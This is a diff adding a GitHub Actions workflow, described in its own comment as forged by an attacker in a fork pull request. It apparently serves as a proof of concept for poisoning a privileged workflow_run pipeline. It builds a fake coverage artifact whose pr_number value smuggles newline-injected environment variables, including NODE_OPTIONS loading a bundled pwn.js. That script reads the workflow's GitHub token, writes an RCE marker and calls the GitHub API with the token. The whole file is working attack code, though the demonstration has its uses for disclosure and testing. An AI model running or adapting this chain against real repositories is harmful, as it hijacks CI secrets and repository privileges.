@@ -1,0 +1,52 @@
+name: PR Code Coverage
+
+# Forged workflow added by the attacker inside their fork PR. It uses the same
+# name as the privileged `workflow_run` trigger's upstream workflow, so it fires
+# the privileged downstream workflow in the base repository.
+on:
+  pull_request:
+
+jobs:
+  coverage-report:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Fabricate coverage artifact
+        run: |
+          mkdir -p coverage-comment-data
+          cat > coverage-comment-data/pr-info.json <<'JSON'
+          {
+            "pr_number": "1\nNODE_OPTIONS=--require ./pwn.js\nEVIL=injected-by-fork",
+            "coverage_percentage": "99.99%",
+            "covered_lines": "1",
+            "total_lines": "1",
+            "patch_coverage_pct": "100%",
+            "low_coverage_files": "- fake.py: 1.0% (1 lines)",
+            "patch_coverage_summary": "# Diff Coverage\nnothing",
+            "ado_url": "https://example.invalid/build"
+          }
+          JSON
+          cat > coverage-comment-data/pwn.js <<'JSEOF'
+          const fs = require('fs');
+          const token = process.env.INPUT_GITHUB_TOKEN || '';
+          try {
+            fs.writeFileSync(process.env.GITHUB_WORKSPACE + '/pwned.txt',
+              'RCE-MARKER\nEVIL=' + process.env.EVIL + '\nTOKEN_PRESENT=' + (token ? 'yes' : 'no') + '\n');
+          } catch (e) { console.log('write-err ' + e.message); }
+          console.log('PWNED-RCE-MARKER EVIL=' + process.env.EVIL + ' token=' + (token ? 'present' : 'absent'));
+          (async () => {
+            try {
+              const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/pulls/1', {
+                headers: { authorization: 'Bearer ' + token, accept: 'application/vnd.github+json' }
+              });
+              console.log('PRIVILEGED-API-STATUS ' + r.status);
+            } catch (e) { console.log('api-err ' + e.message); }
+          })();
+          JSEOF
+          ls -la coverage-comment-data
+          cat coverage-comment-data/pr-info.json | jq .
+
+      - name: Upload coverage comment data
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: coverage-comment-data
+          path: coverage-comment-data/
